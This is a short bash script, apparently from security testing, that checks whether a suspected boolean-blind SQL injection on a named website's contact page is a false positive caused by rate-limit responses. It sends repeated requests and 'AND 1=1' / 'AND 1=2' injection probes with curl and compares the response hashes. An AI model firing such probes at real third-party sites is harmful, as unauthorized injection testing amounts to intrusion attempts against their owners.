#!/bin/bash
# FP-verification: is the "boolean-blind SQLi" oracle just Vercel 429 body uniqueness?
# Fire the SAME payload twice and DIFFERENT payloads, compare bodies.
D=$(dirname "$0"); mkdir -p "$D"
run(){ curl -sk --globoff -D "$D/h_$1.txt" -o "$D/b_$1.html" -w '%{http_code}' "$2"; }
i=0
for label in A B; do
  i=$((i+1))
  # identical payload twice
  run "${label}_same1" "https://www.infinitycapital.bh/contact?cb=1"
  sleep 2
  run "${label}_same2" "https://www.infinitycapital.bh/contact?cb=1"
  sleep 2
  run "${label}_t1" "https://www.infinitycapital.bh/contact?cb=1%20AND%201=1"
  sleep 2
  run "${label}_t2" "https://www.infinitycapital.bh/contact?cb=1%20AND%201=2"
  sleep 2
done
for f in "$D"/b_*.html; do
  printf '%-28s %8s  md5=%s  code=%s\n' "$(basename $f)" "$(stat -c%s $f)" "$(md5sum $f|cut -c1-10)" "$(head -1 $D/h_$(basename $f .html|sed 's/^b_//').txt)"
done